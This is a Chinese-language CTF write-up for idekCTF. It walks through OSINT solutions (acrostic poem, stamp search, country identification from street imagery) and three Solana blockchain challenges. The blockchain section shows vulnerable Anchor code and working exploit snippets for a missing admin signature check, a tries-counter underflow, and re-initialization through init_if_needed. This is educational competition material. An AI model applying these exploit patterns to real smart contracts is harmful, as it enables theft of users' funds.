+<pre class="hljs"><code>This <span class="hljs-keyword">is</span> all you need <span class="hljs-keyword">to</span> know <span class="hljs-keyword">about</span> <span class="hljs-keyword">me</span>! But all <span class="hljs-keyword">is</span> hidden so <span class="hljs-keyword">the</span> police can never find <span class="hljs-keyword">me</span> eheheh.
+However, I do <span class="hljs-keyword">not</span> want <span class="hljs-keyword">to</span> hide forever! I truly believe <span class="hljs-keyword">that</span> we should all be friends.
+Essentially, I am one <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> love <span class="hljs-keyword">and</span> nature!
+Now, let&#x27;s focus <span class="hljs-keyword">on</span> talking <span class="hljs-keyword">about</span> <span class="hljs-keyword">me</span>! I
+am extremely fan <span class="hljs-keyword">of</span> potatoes obvious!
+Must I <span class="hljs-built_in">say</span> I love camels <span class="hljs-keyword">as</span> well?
+Evidently, <span class="hljs-keyword">the</span> image <span class="hljs-keyword">of</span> a potato <span class="hljs-keyword">that</span> eats a camel <span class="hljs-keyword">is</span> legendary.
+In retrospect this page <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">the</span> best idea.
+Surely, nothing will come <span class="hljs-keyword">of</span> <span class="hljs-keyword">it</span> eheh.
+Just <span class="hljs-built_in">read</span> this beautiful poem (Yes I am a poet!):
+Under cover <span class="hljs-keyword">of</span> night
+Like a shadow <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> move
+Invisible <span class="hljs-keyword">to</span> sight
+A stealthy escape I prove
+Never leaving a trace
+Aware <span class="hljs-keyword">of</span> <span class="hljs-keyword">every</span> sound
+Note: The flag <span class="hljs-keyword">is</span> idek{NameOfTheKillerCapitalLetters_APOSIDM723489} <span class="hljs-keyword">where</span> you must <span class="hljs-keyword">put</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> killer <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> start <span class="hljs-keyword">in</span> capital letters</code></pre><p>很明显这个I有换行可能是藏头诗
+<code>THE NaME IS JULIANA</code>
+最后得到flag --&gt; <code>idek{JULIANA_APOSIDM723489}</code></p>
+<h3 id="osint-crime-confusion-4-w-as-in-why"><a class="header-link" href="#osint-crime-confusion-4-w-as-in-why"></a>OSINT Crime Confusion 4: W as in Why</h3>
+<pre class="hljs"><code>You did <span class="hljs-keyword">it</span>! You found <span class="hljs-keyword">the</span> killer!!! But whyy oh why did she do <span class="hljs-keyword">it</span>?
+Apparently she was obsessed <span class="hljs-keyword">with</span> stamps, <span class="hljs-keyword">but</span> was <span class="hljs-keyword">it</span> <span class="hljs-built_in">real</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>?
+Well, I found this image <span class="hljs-keyword">on</span> her computer, maybe <span class="hljs-keyword">it</span> can help you.
+Also a nice poem:
+<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; 
+A man of peace, a collector too
+His name, Johan Jørgen, forever true
+A network vast, across the land
+His passion, stamps, with Olympic brand
+
+A stamp of Seoul, in &#x27;88
+Issued to commemorate, the games we all love
+A rare find, this stamp of Olympic dream
+But where, oh where, can it be seen?
+A man of peace, his legacy lives on
+In stamps and memories, forever strong
+But where to find, this elusive prize
+A mystery yet, to the collector&#x27;s eyes.
+&quot;</span><span class="hljs-string">&quot;&quot;</span> 
+The flag <span class="hljs-keyword">is</span> idek{STAMP_IDENTIFIER}, ex: idek{OLX<span class="hljs-number">-42069</span>}
+Note: This challenge <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> need any information <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> previous challenges</code></pre><p>题目里面的<code>Johan Jørgen</code> 以及提到了邮票 Google可以搜到 翻一翻</p>
+<p class="img-container"><img src="https://imgur.com/Wra2xh7.png" alt=""></p>
+<p><a href="https://digitaltmuseum.no/021027988861/frimerke">https://digitaltmuseum.no/021027988861/frimerke</a></p>
+<p class="img-container"><img src="https://imgur.com/soy8Gzk.png" alt=""></p>
+<p>flag可以拿到 --&gt; <code>idek{OLM-08741}</code></p>
+<h3 id="nmpz"><a class="header-link" href="#nmpz"></a>NMPZ:</h3>
+<pre class="hljs"><code>Are you <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> Rainbolt <span class="hljs-keyword">at</span> GeoGuessr? Prove your skills <span class="hljs-keyword">by</span> geo-guessing these <span class="hljs-number">17</span> countries.
+
+Figure out <span class="hljs-keyword">in</span> which country each image was taken.
+The <span class="hljs-keyword">first</span> letter <span class="hljs-keyword">of</span> <span class="hljs-keyword">every</span> country&#x27;s <span class="hljs-built_in">name</span> will create <span class="hljs-keyword">the</span> flag.
+Countries <span class="hljs-keyword">with</span> <span class="hljs-keyword">over</span> <span class="hljs-number">10</span> million inhabitants will have a capital letter.
+Countries <span class="hljs-keyword">with</span> <span class="hljs-keyword">less than</span> one million inhabitants become an underscore.
+
+Example:
+idek{TEST_flAg}
+<span class="hljs-number">1.</span>png: Turkey
+<span class="hljs-number">2.</span>png: Ecuador
+<span class="hljs-number">3.</span>png: Spain
+<span class="hljs-number">4.</span>png: Thailand
+<span class="hljs-number">5.</span>png: Vatican City
+<span class="hljs-number">6.</span>png: Finland
+<span class="hljs-number">7.</span>png: Lithuania
+<span class="hljs-number">8.</span>png: Argentina
+<span class="hljs-number">9.</span>png: Georgia</code></pre><p>这个题目可谓是相当折磨,并且还有部分涉及到一些奇奇怪怪的知识(比如通过街边的路标得知是哪个国家的道路,以及一些呼吸管什么奇怪的东西.总而言之十分有趣,故此总结)</p>
+<p>标注:编写wp的时候参考了部分来自以下两篇优秀博文的内容</p>
+<p><a href="https://enscribe.dev/ctfs/idek/osint/nmpz/">https://enscribe.dev/ctfs/idek/osint/nmpz/</a></p>
+<p><a href="https://www.louiskronberg.de/blog/geo.html">https://www.louiskronberg.de/blog/geo.html</a></p>
+<p>一些有帮助的网站:</p>
+<p><a href="https://populationstat.com/countries/">https://populationstat.com/countries/</a> 查询国家人口数</p>
+<p><a href="https://www.geoguessr.com/">https://www.geoguessr.com/</a> geoguesser的相关网站 </p>
+<p><a href="https://geohints.com">https://geohints.com</a> 同上</p>
+<p><a href="https://lens.google/">https://lens.google/</a> google识图</p>
+<p><a href="https://www.google.com/maps">https://www.google.com/maps</a> google地图</p>
+<p>第一张图 巴西 Brazil 216,642,000 &gt; 10,000,000 --&gt; <code>idek{B</code></p>
+<p class="img-container"><img src="https://imgur.com/ECMDjsC.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/XhlekIF.png" alt=""></p>
+<p>巴西的里约热内卢著名的基督像-救世基督像 所以一定的巴西</p>
+<p>第二张图 俄罗斯 Russia 143,110,000 &gt; 10,000,000  --&gt; <code>idek{BR</code></p>
+<p class="img-container"><img src="https://imgur.com/HEAZwD8.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/6crgGsZ.png" alt=""></p>
+<p>可以得知,圣瓦西里大教堂(St Basil&#39;s Cathedral)在俄罗斯红场</p>
+<p>第三张图 塔林 Estonia 1,000,000 &lt; 1,319,000 &lt; 10,000,000 --&gt; <code>idek{BRe</code></p>
+<p class="img-container"><img src="https://imgur.com/UkTTRVI.png" alt=""></p>
+<p>可以看到路标 <code>Kalamaja</code></p>
+<p class="img-container"><img src="https://imgur.com/FKFwILB.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/xVa4W34.png" alt=""></p>
+<p>可以搜到其在爱沙尼亚首都塔林的北塔林区的一个街区</p>
+<p>所以是爱沙尼亚</p>
+<p>第四张图 澳大利亚 Australia 26,278,000 &gt; 10,000,000 --&gt; <code>idek{BReA</code></p>
+<p class="img-container"><img src="https://imgur.com/6DZDLtf.png" alt=""></p>
+<p>Google识图 应该可以直接搞出来是 斯图尔特公路(英语:StuartHighway) 澳大利亚</p>
+<p class="img-container"><img src="https://imgur.com/roljo10.png" alt=""></p>
+<p>当然也可以通过公路旁边的护柱 来进行判断</p>
+<p class="img-container"><img src="https://imgur.com/94EUStv.png" alt=""></p>
+<p>可以通过<a href="https://geohints.com/Bollards">https://geohints.com/Bollards</a> 进行查询 可以找到类似的信息</p>
+<p class="img-container"><img src="https://imgur.com/K78tOdq.png" alt=""></p>
+<p>同时还有红土 红土在澳大利亚特有</p>
+<p>第五张图 肯尼亚 Kenya 57,459,000  &gt; 10,000,000 --&gt; <code>idek{BReAK</code></p>
+<p class="img-container"><img src="https://imgur.com/c9jQExg.png" alt=""></p>
+<p>第五张图比较困难 你可能会收到来自 <code>AL-SRAAD FLAZA</code>等信息的一些提示</p>
+<p class="img-container"><img src="https://imgur.com/qDl4reR.png" alt=""></p>
+<p>同时你可以结合一些阿拉伯语特征得知其应该是一个讲阿拉伯语的国家</p>
+<p class="img-container"><img src="https://imgur.com/nWGz0IY.png" alt=""></p>
+<p>不过这些很难以锁定于这个国家的一些相关信息 不过很关键的在这里,汽车有一个类似于通气管的东西</p>
+<p class="img-container"><img src="https://imgur.com/TN8N1du.png" alt=""></p>
+<p>经过搜索我找到了这个东西
+<a href="https://twitter.com/geoguessr/status/1564621460034969606">https://twitter.com/geoguessr/status/1564621460034969606</a></p>
+<p class="img-container"><img src="https://imgur.com/LKHqyZB.png" alt=""></p>
+<p>所以最后的国家是肯尼亚 奇怪的知识增加了!
+另外可以搜索<code>peri peri pizza third street</code>也可以找到</p>
+<p class="img-container"><img src="https://imgur.com/XcF5srC.png" alt=""></p>
+<p>第六张图 冰岛 Iceland 376,000 &lt; 1,000,000 --&gt; <code>idek{BReAK_</code></p>
+<p class="img-container"><img src="https://imgur.com/VVX7vt7.png" alt=""></p>
+<p>本题可以有三种做法</p>
+<ol class="list">
+<li>google识图可以大部分确定是来自冰岛</li>
+</ol>
+<p class="img-container"><img src="https://imgur.com/7KvDVE2.png" alt=""></p>
+<ol start="2">
+<li>通过路标 可以进行一部分的识别</li>
+</ol>
+<p class="img-container"><img src="https://imgur.com/rPudJwO.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/dxrqWOV.png" alt=""></p>
+<ol start="3">
+<li>通过街景可以得到一些信息 比如阴间 白色的虚线 黄绿色草地等等</li>
+</ol>
+<p class="img-container"><img src="https://imgur.com/PIbUmfq.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/ApNCh7p.png" alt=""></p>
+<p>第七张图 蒙古 Mongolia 1,000,000 &lt; 3,425,000 &lt; 10,000,000 --&gt; <code>idek{BReAK_m</code></p>
+<p class="img-container"><img src="https://imgur.com/sKHWZwE.png" alt=""></p>
+<p>万能google视图显示其来自蒙古</p>
+<p class="img-container"><img src="https://imgur.com/sjpuWg1.png" alt=""></p>
+<p>第八张图 可能是e 因为前面有个m 猜一下可能是e但是不确定是不是E还是e 最后flag提交是e --&gt; <code>idek{BReAK_me</code> 不太会社 他们讨论得出的国家是斯威士兰 
+估计是特殊的平顶山地形进行的范围缩小</p>
+<p class="img-container"><img src="https://imgur.com/x6kkcD0.png" alt=""></p>
+<p>第九张图 摩纳哥 Monaco 40,000 &lt; 1,000,000 --&gt; <code>idek{BReAK_me_</code></p>
+<p class="img-container"><img src="https://imgur.com/wu91Oqt.png" alt=""></p>
+<p>可以找到一个地标性建筑 蒙特卡洛歌剧院 位于摩纳哥</p>
+<p class="img-container"><img src="https://imgur.com/RNL3Crd.png" alt=""></p>
+<p>第十张图 瑞士 switzerland  1,000,000 &lt; 8,805,000 &lt; 10,000,000 --&gt; <code>idek{BReAK_me_s</code></p>
+<p class="img-container"><img src="https://imgur.com/T59wNT6.png" alt=""></p>
+<p>其实可以通过这里获得 瑞士国旗</p>
+<p class="img-container"><img src="https://imgur.com/Wpmjacl.png" alt=""></p>
+<p>第十一张图 波兰 Poland 37,647,000 &gt; 10,000,0000 --&gt; <code>idek{BReAK_me_sP</code></p>
+<p class="img-container"><img src="https://imgur.com/e8WV8OS.png" alt=""></p>
+<p>护柱大法好</p>
+<p class="img-container"><img src="https://imgur.com/rZGAxjy.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/XC4bbxb.png" alt=""></p>
+<p>同时双中心道路线、道路虚线也可以锁定其来自于波兰
+第十二张图 奥地利 Austria 1,000,000 &lt; 8,978,000 &lt; 10,000,000 --&gt; <code>idek{BReAK_me_sPa</code></p>
+<p class="img-container"><img src="https://imgur.com/kLNKUsw.png" alt=""></p>
+<p>我们可以锁定这里<code>ELEKTRO Weißensteiner</code> </p>
+<p class="img-container"><img src="https://imgur.com/nCyW6DS.png" alt=""></p>
+<p>Google map可以搜到<code>Elektro Weißensteiner GmbH</code>位于奥地利</p>
+<p class="img-container"><img src="https://imgur.com/gyOHS1k.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/4zUTJ9A.png" alt=""></p>
+<p>第十三张图 加拿大 Canada 38,864,000 &gt; 10,000,000 --&gt; <code>idek{BReAK_me_sPaC</code></p>
+<p class="img-container"><img src="https://imgur.com/Oj2PtCc.png" alt=""></p>
+<p>通过Google识图得知其应该来自于北美地区也就是我们需要区别美国和加拿大</p>
+<p class="img-container"><img src="https://imgur.com/i3st5oN.png" alt=""></p>
+<p>本题需要通过图上的虚线进行区分</p>
+<p class="img-container"><img src="https://imgur.com/8as1rhm.png" alt=""></p>
+<p>似乎这种单虚线的黄线只有加拿大才会出现,美国和加拿大共有双实线黄线和一实一虚的黄线</p>
+<p>如果从气象上来看,其更冷,可能更偏向于北方地区,也就是加拿大</p>
+<p>第十四张图 厄瓜多尔 Ecuador 18,324,000 &gt; 10,000,000 --&gt; <code>idek{BReAK_me_sPaCE</code></p>
+<p class="img-container"><img src="https://imgur.com/gJyMZGJ.png" alt=""></p>
+<p>然后我们可以从车牌来进行进一步的约束 可以得知是厄瓜多尔的出租车车牌</p>
+<p class="img-container"><img src="https://imgur.com/TW0uI7Z.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/fFxaiQ7.png" alt=""></p>
+<p>另外也可以通过指向进行进一步的范围缩小 淡黄色,单极,2 个相邻的指向  </p>
+<p class="img-container"><img src="https://imgur.com/JEsghus.png" alt=""></p>
+<p>第十五张图 保加利亚 Bulgaria 1,000,000 &lt; 6,793,000 &lt; 10,000,000 --&gt; <code>idek{BReAK_me_sPaCEb</code></p>
+<p class="img-container"><img src="https://imgur.com/5pMK1WQ.png" alt=""></p>
+<p>可以注意这个垃圾桶</p>
+<p class="img-container"><img src="https://imgur.com/C4NKG6k.png" alt=""></p>
+<p>可以得到类似于KMA的字符 可以搜索得知其基本供货于东欧,俄罗斯地区</p>
+<p class="img-container"><img src="https://imgur.com/htNtDfA.png" alt=""></p>
+<p>同时常年下雪以及一些道路基础较差可以得到相关的信息其来自于保加利亚</p>
+<p>第十六张图 阿尔巴尼亚 Albania  1,000,000 &lt; 2,796,000 &lt; 10,000,000 --&gt; <code>idek{BReAK_me_sPaCEba</code></p>
+<p class="img-container"><img src="https://imgur.com/ea5qUHy.png" alt=""></p>
+<p>可以通过两部分判断 一个是特殊的人字形符号</p>
+<p class="img-container"><img src="https://imgur.com/DgCoDQl.png" alt=""></p>
+<p>可以发现这样的一张图
+<a href="https://www.reddit.com/r/geoguessr/comments/lwa9wr/map_of_european_road_curve_chevron_signs/">https://www.reddit.com/r/geoguessr/comments/lwa9wr/map_of_european_road_curve_chevron_signs/</a></p>
+<p class="img-container"><img src="https://imgur.com/Lfoakxt.png" alt=""></p>
+<p>可以得知使用黑底白字的国家是英国、瑞士、意大利、希腊、阿尔巴尼亚还有西班牙
+同时在图片的上方有个奇怪的折痕</p>
+<p class="img-container"><img src="https://imgur.com/qDNkWjl.png" alt=""></p>
+<p>在一些特定的国家中,Photo Sphere的相机有一些缺陷导致了这些折痕这里可以查到
+<a href="https://geohints.com/Rifts">https://geohints.com/Rifts</a></p>
+<p class="img-container"><img src="https://imgur.com/VEborou.png" alt=""></p>
+<p>所以该国家是阿尔巴尼亚</p>
+<p>第十七张图 俄罗斯 Russia 143,110,000 &gt; 10,000,000  --&gt; <code>idek{BReAK_me_sPaCEbaR}</code></p>
+<p class="img-container"><img src="https://imgur.com/Fek16KK.png" alt=""></p>
+<p>本题是我认为最抽象的,大部分比赛时候的解决方案基本上都是进行直接的单词猜测但是其预期的思路是分析这个植物</p>
+<p class="img-container"><img src="https://imgur.com/3indKEU.png" alt=""></p>
+<p><a href="https://en.wikipedia.org/wiki/Petasites_japonicus">https://en.wikipedia.org/wiki/Petasites_japonicus</a> 也就是蜂斗菜,它原产于库页岛、日本、中国和韩国地区</p>
+<p>所以本题所在的地区应该是库页岛上,所以是俄罗斯</p>
+<p>总而言之 奇奇怪怪的知识增加了</p>
+<p>最后flag --&gt; <code>idek{BReAK_me_sPaCEbaR}</code></p>
+<h2 id="blockchain"><a class="header-link" href="#blockchain"></a>BlockChain:</h2>
+<h3 id="baby-solana-1"><a class="header-link" href="#baby-solana-1"></a>Baby Solana 1:</h3>
+<pre class="hljs"><code><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Deposit</span></span>&lt;<span class="hljs-symbol">&#x27;info</span>&gt; {
+    <span class="hljs-meta">#[account(
+        mut,
+        seeds = [ b<span class="hljs-meta-string">&quot;CONFIG&quot;</span> ]</span>,
+        bump,
+        has_one = admin
+    )]
+    <span class="hljs-keyword">pub</span> config: Account&lt;<span class="hljs-symbol">&#x27;info</span>, Config&gt;,
+
+    <span class="hljs-meta">#[account(
+        mut,
+        seeds = [ b<span class="hljs-meta-string">&quot;RESERVE&quot;</span> ]</span>,
+        bump,
+        constraint = reserve.mint == mint.key(),
+    )]
+    <span class="hljs-keyword">pub</span> reserve: Account&lt;<span class="hljs-symbol">&#x27;info</span>, TokenAccount&gt;,
+
+    <span class="hljs-meta">#[account(
+        mut,
+        seeds = [b<span class="hljs-meta-string">&quot;account&quot;</span>, user.key().as_ref()]</span>,
+        bump,
+        constraint = user_account.mint == mint.key(),
+        constraint = user_account.owner == user.key(),
+    )]
+    <span class="hljs-keyword">pub</span> user_account: Account&lt;<span class="hljs-symbol">&#x27;info</span>, TokenAccount&gt;,
+
+    <span class="hljs-keyword">pub</span> mint: Account&lt;<span class="hljs-symbol">&#x27;info</span>, Mint&gt;,
+
+    <span class="hljs-meta">#[account(mut)]</span>
+    <span class="hljs-keyword">pub</span> admin: AccountInfo&lt;<span class="hljs-symbol">&#x27;info</span>&gt;,
+    
+    <span class="hljs-meta">#[account(mut)]</span>
+    <span class="hljs-keyword">pub</span> user:  Signer&lt;<span class="hljs-symbol">&#x27;info</span>&gt;,
+    <span class="hljs-keyword">pub</span> token_program: Program&lt;<span class="hljs-symbol">&#x27;info</span>, Token&gt;,
+    <span class="hljs-keyword">pub</span> system_program: Program&lt;<span class="hljs-symbol">&#x27;info</span>, System&gt;,
+    <span class="hljs-keyword">pub</span> rent: Sysvar&lt;<span class="hljs-symbol">&#x27;info</span>, Rent&gt;,
+}</code></pre><p>Despoit函数不需要admin的签名，可以被任意调用</p>
+<p>利用：</p>
+<pre class="hljs"><code><span class="hljs-keyword">let</span> deposit_accounts = chall::cpi::accounts::Deposit {
+            config: ctx.accounts.config.to_account_info(),
+            reserve: ctx.accounts.reserve.to_account_info(),
+            user_account: ctx.accounts.user_account.to_account_info(),
+            mint: ctx.accounts.mint.to_account_info(),
+            admin: ctx.accounts.admin.to_account_info(),
+            user: ctx.accounts.user.to_account_info(),
+            token_program: ctx.accounts.token_program.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+            rent: ctx.accounts.rent.to_account_info(),
+        };
+        <span class="hljs-keyword">let</span> cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), deposit_accounts);
+        chall::cpi::deposit(cpi_deposit, <span class="hljs-number">200</span>)?;</code></pre><h3 id="baby-blockchain-2"><a class="header-link" href="#baby-blockchain-2"></a>Baby Blockchain 2:</h3>
+<pre class="hljs"><code><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">attempt</span></span>(ctx: Context&lt;Attempt&gt;) -&gt; <span class="hljs-built_in">Result</span>&lt;()&gt; {
+    <span class="hljs-keyword">let</span> record = &amp;<span class="hljs-keyword">mut</span> ctx.accounts.record;
+    msg!(<span class="hljs-string">&quot;[CHALL] attempt.tries {}&quot;</span>, record.tries);
+    <span class="hljs-keyword">if</span> record.tries &gt; <span class="hljs-number">0</span> {
+        <span class="hljs-keyword">let</span> reserve_bump = [*ctx.bumps.get(<span class="hljs-string">&quot;reserve&quot;</span>).unwrap()];
+        <span class="hljs-keyword">let</span> signer_seeds = [
+            <span class="hljs-string">b&quot;RESERVE&quot;</span>,
+            reserve_bump.as_ref()
+        ];
+        <span class="hljs-keyword">let</span> signer = &amp;[&amp;signer_seeds[..]];
+
+        <span class="hljs-keyword">let</span> withdraw_ctx = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.reserve.to_account_info(),
+                to: ctx.accounts.user_account.to_account_info(),
+                authority: ctx.accounts.reserve.to_account_info()
+            },
+            signer
+        );
+        token::transfer(withdraw_ctx, record.tries <span class="hljs-keyword">as</span> <span class="hljs-built_in">u64</span>)?;
+    }
+
+
+    record.tries -= <span class="hljs-number">1</span>;
+
+    <span class="hljs-literal">Ok</span>(())
+}</code></pre><p>每次调用attempt会 record.tries -= 1 初始化给予3 tries，连续四次调用溢出</p>
+<p>利用：</p>
+<pre class="hljs"><code> <span class="hljs-keyword">for</span> _n <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>..<span class="hljs-number">4</span> {
+        <span class="hljs-keyword">let</span> cpi_accounts = chall::cpi::accounts::Attempt {
+            reserve: ctx.accounts.reserve.to_account_info(),
+            record: ctx.accounts.user_record.to_account_info(),
+            user_account: ctx.accounts.user_account.to_account_info(),
+            mint: ctx.accounts.mint.to_account_info(),
+            user: ctx.accounts.user.to_account_info(),
+            token_program: ctx.accounts.token_program.to_account_info(),
+        };
+        <span class="hljs-keyword">let</span> cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
+        chall::cpi::attempt(cpi_ctx)?;
+    }</code></pre><h3 id="baby-blockchain-3"><a class="header-link" href="#baby-blockchain-3"></a>Baby Blockchain 3:</h3>
+<p>比赛中没用做出来 差了一点点 赛后复现</p>
+<pre class="hljs"><code><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Initialize</span></span>&lt;<span class="hljs-symbol">&#x27;info</span>&gt; {
+    <span class="hljs-meta">#[account(
+        init_if_needed,
+        seeds = [ b<span class="hljs-meta-string">&quot;CONFIG&quot;</span> ]</span>,
+        bump,   
+        payer = admin,
+        space = Config::SIZE,
+    )]
+    <span class="hljs-keyword">pub</span> config: Account&lt;<span class="hljs-symbol">&#x27;info</span>, Config&gt;,
+
+    <span class="hljs-meta">#[account(
+        init_if_needed,
+        seeds = [ b<span class="hljs-meta-string">&quot;RESERVE&quot;</span> ]</span>,
+        bump,
+        payer = admin,
+        token::mint = mint,
+        token::authority = reserve
+    )]
+    <span class="hljs-keyword">pub</span> reserve: Account&lt;<span class="hljs-symbol">&#x27;info</span>, TokenAccount&gt;,
+
+    <span class="hljs-keyword">pub</span> mint: Account&lt;<span class="hljs-symbol">&#x27;info</span>, Mint&gt;,
+    <span class="hljs-meta">#[account(mut)]</span>
+    <span class="hljs-keyword">pub</span> admin: Signer&lt;<span class="hljs-symbol">&#x27;info</span>&gt;,
+    <span class="hljs-keyword">pub</span> token_program: Program&lt;<span class="hljs-symbol">&#x27;info</span>, Token&gt;,
+    <span class="hljs-keyword">pub</span> system_program: Program&lt;<span class="hljs-symbol">&#x27;info</span>, System&gt;,
+    <span class="hljs-keyword">pub</span> rent: Sysvar&lt;<span class="hljs-symbol">&#x27;info</span>, Rent&gt;,
+}</code></pre><p>init_if_needed使得合约可以被再次初始化</p>
+<p>利用：</p>
+<pre class="hljs"><code> <span class="hljs-keyword">let</span> reinitialize = chall::cpi::accounts::Initialize {
+            config: ctx.accounts.config.to_account_info(),
+            reserve: ctx.accounts.reserve.to_account_info(),
+            mint: ctx.accounts.mint.to_account_info(),
+            admin: ctx.accounts.user.to_account_info(), <span class="hljs-comment">//make me admin</span>
+            token_program: ctx.accounts.token_program.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+            rent: ctx.accounts.rent.to_account_info(),
+        };
+        <span class="hljs-keyword">let</span> cpi_reinit = CpiContext::new(ctx.accounts.chall.to_account_info(), reinitialize);
+        chall::cpi::initialize(cpi_reinit)?;
+
+        <span class="hljs-keyword">let</span> deposit_accounts = chall::cpi::accounts::Deposit {
+            config: ctx.accounts.config.to_account_info(),
+            reserve: ctx.accounts.reserve.to_account_info(),
+            user_account: ctx.accounts.user_account.to_account_info(),
+            mint: ctx.accounts.mint.to_account_info(),
+            admin: ctx.accounts.user.to_account_info(), <span class="hljs-comment">//i am now admin</span>
+            user: ctx.accounts.user.to_account_info(),
+            token_program: ctx.accounts.token_program.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+            rent: ctx.accounts.rent.to_account_info(),
+        };
+        <span class="hljs-keyword">let</span> cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), deposit_accounts);
+        chall::cpi::deposit(cpi_deposit, <span class="hljs-number">1000</span>)?;</code></pre><p> anchor_lang::prelude文档(<a href="https://docs.rs/anchor-lang/latest/anchor_lang/prelude/index.html">https://docs.rs/anchor-lang/latest/anchor_lang/prelude/index.html</a>)</p>
+<h2 id="结语"><a class="header-link" href="#结语"></a>结语:</h2>
+<p>总而言之,其misc以及OSINT的部分题目比较有趣,故此分享.如果文章中有什么错误欢迎通过邮件指出感谢!</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
